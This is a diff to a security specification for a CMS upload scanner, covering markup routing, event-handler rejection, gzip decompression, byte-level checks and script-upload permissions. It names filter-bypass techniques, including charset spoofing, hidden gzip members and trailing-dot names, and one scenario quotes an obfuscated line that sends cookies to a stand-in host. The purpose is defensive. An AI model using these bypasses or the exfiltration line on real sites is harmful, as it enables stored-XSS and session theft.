@@ -27,8 +27,8 @@ Scanning rejects; it never repairs. Content that trips a rule SHALL be refused w
 - **THEN** the crop proceeds, with the content scan running against the source and the output filename selecting the ruleset — the exemption that previously skipped it no longer applies
 
 #### Scenario: Re-crop under a different extension cannot bypass the ruleset
-- **WHEN** a user without `media_unfiltered_upload` uploads an SVG that the SVG ruleset accepts, then re-crops it supplying an output name ending in `.html`
-- **THEN** the re-crop is scanned under the non-SVG ruleset and rejected, so the bytes are never served as `text/html`
+- **WHEN** a user without `media_unfiltered_upload` uploads an SVG that the markup ruleset accepts, then re-crops it supplying an output name ending in `.html`
+- **THEN** the re-crop is scanned under the markup ruleset selected by the output name and rejected if it carries anything that ruleset refuses, so the bytes are never served as live `text/html`
 
 #### Scenario: A private-media source is still scanned
 - **WHEN** a file outside the public root (for example under the private-media directory) is used as an upload source
@@ -104,9 +104,17 @@ The system SHALL normalize file content before matching it against the malicious
 
 ### Requirement: Reject uploaded files with event handler attributes
 
-The system SHALL reject file uploads whose content contains known executable event handler attributes before storing or persisting the file. Rejection SHALL leave no copy of the file on disk, including the copy in the upload staging directory.
+The system SHALL reject file uploads whose content contains executable event handler attributes before storing or persisting the file. Rejection SHALL leave no copy of the file on disk, including the copy in the upload staging directory.
 
-**Change**: SVG files are no longer scanned for event handlers using the regex denylist — SVG content checks are handled by the XML parse-based checker in the `svg-upload-sanitization` capability. Non-SVG files continue to be scanned by the regex pipeline, now applied to normalized content.
+**Change**: markup uploads — every extension a browser parses as markup, not only `.svg` — are scanned for event handlers by the parse-based checker in the `svg-upload-sanitization` capability, which rejects any attribute whose name begins with `on` by shape rather than by matching a list of handler names. The parse decides which handlers are present; a byte-level backstop over the same bytes catches handlers and blocked elements the parse would miss because it autodetected an encoding a browser resolves differently (see "Markup is scanned at the byte level as well as the parse level"). The regex denylist is not the *only* control for markup, but it is not removed from it either: its incompleteness cannot produce a stored-XSS path on non-markup uploads, where it continues to apply as defense-in-depth.
+
+#### Scenario: A markup file with an unlisted handler is rejected
+- **WHEN** a user uploads an `.html` file whose content includes an `onpointerdown`, `ontouchstart`, `onauxclick` or `onemptied` attribute
+- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
+
+#### Scenario: A markup file with a listed handler is still rejected
+- **WHEN** a user uploads an `.html` file whose content includes an `onclick` or `onload` attribute
+- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
 
 #### Scenario: Non-SVG file with onclick is rejected
 - **WHEN** a user uploads a non-SVG file whose content includes an `onclick` attribute
@@ -231,27 +239,199 @@ substitute bytes the scanner never saw. It implements the `security-capability-g
   replaces `settings[:uploaded_io]`
 - **THEN** the pipeline does not scan the content a second time after the hook
 
-### Requirement: SVG detection at scan time is case-insensitive
+### Requirement: Scan ruleset is selected by how the stored file will be rendered
 
-The content scanner SHALL treat an upload whose filename extension is `.svg` in any case as an SVG,
-routing it to the SVG-specific parser (`SvgContentChecker`) rather than the generic denylist scan.
-An uppercase-extension SVG (`evil.SVG`) therefore cannot reach the weaker generic ruleset that does
-not list SVG-only vectors such as `foreignObject`. A filename whose basename is exactly `.svg` (a
-dotfile, which `File.extname` reports as having no extension) SHALL be treated as an SVG as well,
-preserving the fail-closed routing of the suffix check this requirement replaced.
+The content scanner SHALL choose its ruleset from how a browser will parse the stored file, not
+from a literal `.svg` comparison. An upload whose filename extension is one a browser parses as
+markup SHALL be routed to the parse-based markup checker (`svg-upload-sanitization`); every other
+upload SHALL be scanned by the generic pattern ruleset.
 
-#### Scenario: Uppercase-extension SVG is routed to the SVG parser
+The markup extensions SHALL be `svg`, `svgz`, `svg.gz`, `html`, `htm`, `xhtml`, `xht`, `shtml`,
+`xml`, `xsl` and `xslt`. Matching SHALL be case-insensitive, and a filename whose basename is
+exactly one of these extensions with no stem (a dotfile, which reports no extension) SHALL be
+treated as markup as well, so routing fails closed.
 
-- **WHEN** `content_unsafe?` is called with a filename ending in `.SVG` (or any other case)
-- **THEN** the content is evaluated by the SVG parser, not the generic pattern scan
+Trailing dots and spaces SHALL be stripped from the filename before the extension is read, because
+a server or filesystem may strip them and serve `evil.svg.` as `evil.svg` — so the routing key must
+match how the file is served, not the raw name.
 
-#### Scenario: An SVG-only vector is rejected regardless of extension case
+The generic ruleset remains in force for non-markup uploads as defense-in-depth. It SHALL NOT be
+the only control for any content a browser parses as markup.
 
-- **WHEN** an SVG carrying a `foreignObject` element is scanned as `image.svg` and as `image.SVG`
+#### Scenario: The same payload is refused under every markup extension
+- **WHEN** content carrying an `onpointerdown` attribute is scanned as `x.svg`, `x.svgz`, `x.html`, `x.htm`, `x.xhtml` and `x.xml`
+- **THEN** every one of them is reported unsafe
+
+#### Scenario: An uppercase markup extension is routed to the markup checker
+- **WHEN** `content_unsafe?` is called with a filename ending in `.HTML` or `.SVG`
+- **THEN** the content is evaluated by the parse-based markup checker, not the generic pattern scan
+
+#### Scenario: A bare markup dotfile name keeps markup routing
+- **WHEN** `content_unsafe?` is called with a filename whose basename is exactly `.svg` or `.html`, in any case
+- **THEN** the content is evaluated by the parse-based markup checker
+
+#### Scenario: A trailing-dot markup name is routed to the markup checker
+- **WHEN** `content_unsafe?` is called with a filename ending in `.svg.` or `.svg ` (a trailing dot or space)
+- **THEN** the content is evaluated by the parse-based markup checker, because the trailing character is stripped before the extension is read
+
+#### Scenario: A markup-only vector is rejected regardless of extension case
+- **WHEN** markup carrying a `foreignObject` element is scanned as `image.svg` and as `image.SVG`
 - **THEN** both are rejected as unsafe
 
-#### Scenario: A bare `.svg` dotfile name keeps SVG routing
+#### Scenario: A non-markup upload keeps the generic ruleset
+- **WHEN** a `.txt` file whose text contains `if a<b and on=1 then x` is scanned
+- **THEN** it is not routed to the markup checker and is accepted, because a `.txt` is not served as markup
 
-- **WHEN** `content_unsafe?` is called with a filename whose basename is exactly `.svg`, in any case
-- **THEN** the content is evaluated by the SVG parser, not the generic pattern scan
+### Requirement: Compressed markup is decompressed before scanning
+
+The system SHALL decompress gzip-compressed markup uploads and scan the decompressed bytes, because
+compressed content is opaque to every detection rule and would otherwise pass unexamined.
+
+A gzip stream may hold several concatenated members, and a compliant decoder — the browser serving
+the file with `Content-Encoding: gzip`, the gzip CLI, zlib — returns the concatenation of them all.
+The system SHALL decompress every member, not only the first, so a hostile payload cannot be hidden
+behind a clean decoy member.
+
+Decompression SHALL be bounded by a maximum decompressed size, counted across all members. An upload
+that exceeds the bound SHALL be refused rather than decompressed further, so a compression bomb
+cannot exhaust memory.
+
+An upload carrying a compressed-markup extension whose bytes are not valid gzip SHALL be scanned as
+raw markup rather than skipped, because a web server may serve those bytes as markup regardless of
+the name suggesting compression.
+
+#### Scenario: A hostile compressed SVG is rejected
+- **WHEN** a user uploads a `.svgz` whose gzip payload decompresses to an SVG containing an `onpointerdown` attribute
+- **THEN** the upload is refused with `Potentially malicious content found!` and no file is persisted
+
+#### Scenario: A clean compressed SVG is accepted
+- **WHEN** a user uploads a `.svgz` whose gzip payload decompresses to an SVG with no dangerous elements, attributes or URIs
+- **THEN** the upload is stored normally
+
+#### Scenario: A compression bomb is refused rather than expanded
+- **WHEN** a user uploads a `.svgz` whose payload would decompress beyond the maximum decompressed size
+- **THEN** the upload is refused and decompression stops at the bound
+
+#### Scenario: Uncompressed bytes under a compressed extension are still scanned
+- **WHEN** a user uploads a `.svgz` whose bytes are plain, ungzipped SVG containing an `onclick` attribute
+- **THEN** the upload is refused, because the bytes are scanned as raw markup
+
+#### Scenario: A payload hidden past the first gzip member is refused
+- **WHEN** a user uploads a `.svgz` built from two concatenated gzip members, the first a clean SVG fragment and the second carrying an `onpointerdown` attribute
+- **THEN** the upload is refused, because every member is decompressed and scanned, not only the first
+
+#### Scenario: A clean multi-member gzip is accepted
+- **WHEN** a user uploads a `.svgz` of several gzip members that together decompress to a clean SVG
+- **THEN** the upload is accepted, because the members are decompressed and scanned rather than rejected for being multi-member
+
+### Requirement: Markup is scanned at the byte level as well as the parse level
+
+A markup parser autodetects its character encoding from in-band signals — a BOM, an XML
+declaration, or a `<meta charset>` element. A browser can resolve the same signals differently; in
+particular WHATWG maps a `utf-16` or `utf-32` `<meta charset>` back to UTF-8, so a pure-ASCII
+document that declares `utf-16` fires its event handlers in the browser while the parser re-decodes
+the bytes as UTF-16 and sees none. The scan SHALL NOT depend on the parser choosing the same
+encoding as the browser.
+
+For every markup upload the system SHALL therefore apply a byte-level check in addition to the
+parse: it SHALL strip NUL and C0 control bytes (collapsing UTF-16/UTF-32 padding, and the byte
+tricks a URL parser ignores) and refuse the upload if the result contains an event-handler
+attribute or a blocked element. This byte check SHALL NOT decode HTML entities, so a document that
+merely displays escaped markup (`&lt;script&gt;`) is not refused by it — a character reference in a
+tag or attribute *name* is never decoded by a browser, so decoding would add no coverage while
+reintroducing that false positive.
+
+#### Scenario: A spoofed `<meta charset>` cannot hide a handler from the scan
+- **WHEN** a user uploads an `.html` file of pure-ASCII bytes declaring `<meta charset="utf-16">` and carrying an `onerror` attribute
+- **THEN** the upload is refused, because the byte-level check matches the handler regardless of the encoding the parser autodetected
+
+#### Scenario: Real wide-encoded markup bytes carrying a handler are refused
+- **WHEN** a user uploads markup encoded as UTF-16 whose text carries an `onerror` attribute
+- **THEN** the upload is refused, because stripping the NUL padding collapses the handler to the bytes a browser would run
+
+#### Scenario: The byte-level check does not entity-decode
+- **WHEN** a user uploads a markup file whose only script-like content is escaped (`<p>Use &lt;script&gt; carefully</p>`)
+- **THEN** the byte-level check does not refuse it, leaving the parse to accept it as displayed text
+
+### Requirement: Executable script uploads require the unfiltered-upload permission
+
+The system SHALL refuse uploads whose filename extension is an executable script type from any user
+who does not hold `media_unfiltered_upload`. The script extensions SHALL be `js`, `mjs`, `cjs`,
+`wasm` and `swf`. Matching SHALL be case-insensitive and SHALL apply the same fail-closed dotfile
+handling as markup routing.
+
+The refusal is an authorization decision, not a scan result. Script content cannot be meaningfully
+scanned: JavaScript has no safe subset and every dangerous capability is reachable through dynamic
+construction, so a name-based rule is defeated by trivial obfuscation. A scanner that cannot reach a
+verdict fails closed.
+
+Users holding `media_unfiltered_upload` SHALL be unaffected, since that permission already skips
+scanning entirely and therefore already permits these uploads.
+
+#### Scenario: An untrusted user cannot upload JavaScript
+- **WHEN** a user without `media_unfiltered_upload` uploads a `.js` file
+- **THEN** the upload is refused and no file is persisted
+
+#### Scenario: Obfuscation does not change the outcome
+- **WHEN** a user without `media_unfiltered_upload` uploads a `.js` file containing `window['fet'+'ch']('//evil.example/'+document['coo'+'kie'])`
+- **THEN** the upload is refused, because the refusal is by extension and not by content inspection
+
+#### Scenario: Module and WebAssembly extensions are covered
+- **WHEN** a user without `media_unfiltered_upload` uploads a `.mjs`, `.cjs` or `.wasm` file
+- **THEN** the upload is refused
+
+#### Scenario: A permitted user may still upload script
+- **WHEN** a user holding `media_unfiltered_upload` uploads a `.js` file
+- **THEN** the upload is stored normally
+
+#### Scenario: A script upload outside a request context is refused
+- **WHEN** a `.js` upload is attempted with no current request user or no current site
+- **THEN** the upload is refused, matching the fail-closed permission behavior for scanning
+
+### Requirement: Already-stored uploads can be re-examined against the current rules
+
+The system SHALL provide a report-only task that scans files already stored under the media root and
+reports those the current rules would refuse. The new rules apply at upload time, so files stored
+before this change are never otherwise re-examined.
+
+The task SHALL locate each site's media directory the same way uploads are stored — honouring the
+`media_slug_folder` configuration, which places uploads under `media/<slug>` rather than
+`media/<id>` — so that on a slug-configured install it does not silently scan an empty path and
+report a false all-clear.
+
+The task SHALL include stored files whose basename begins with a dot. A basename that is entirely an
+extension (`.svg`, `.js`) is exactly what upload routing fails closed on, so omitting such names
+would leave the strictest cases out of the report.
+
+The task SHALL also scan the private-media directory, not only the public media roots. Private
+uploads are scanned at save time exactly like public ones, so files stored before these rules apply
+are equally worth surfacing; reporting only the public root would overstate the task's coverage.
+
+The task SHALL NOT delete, move, quarantine or rewrite any file. Its output SHALL identify each
+finding by site and path, and SHALL state the rule that would refuse it, so an operator can decide
+what to do.
+
+#### Scenario: A stored hostile markup file is reported
+- **WHEN** the task runs over a media root containing an `.html` file with an `onpointerdown` attribute
+- **THEN** the file is listed in the report with the rule that would refuse it
+
+#### Scenario: A stored script file is reported
+- **WHEN** the task runs over a media root containing a `.js` file
+- **THEN** the file is listed in the report as a script type that untrusted users may no longer upload
+
+#### Scenario: The task never modifies stored content
+- **WHEN** the task completes over a media root containing files it reports
+- **THEN** every reported file remains present and byte-identical
+
+#### Scenario: A clean media root reports nothing
+- **WHEN** the task runs over a media root whose files all pass the current rules
+- **THEN** the report is empty and the task exits successfully
+
+#### Scenario: A stored dotfile is reported
+- **WHEN** the task runs over a media root containing a file whose basename is exactly `.js`
+- **THEN** the file is listed in the report, because dotfiles are not skipped
+
+#### Scenario: A flagged private-media file is reported
+- **WHEN** the task runs with a file stored under the private-media directory that the current rules would refuse
+- **THEN** the file is listed in the report, because private media is scanned as well as public
 
